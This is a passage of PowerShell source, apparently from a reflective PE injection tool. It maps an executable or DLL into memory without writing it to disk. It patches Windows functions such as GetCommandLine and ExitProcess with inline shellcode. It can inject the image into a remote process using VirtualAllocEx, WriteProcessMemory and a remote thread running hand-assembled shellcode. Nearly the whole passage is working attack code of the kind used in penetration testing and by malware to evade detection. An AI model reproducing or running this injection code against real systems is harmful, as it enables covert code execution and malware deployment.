			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
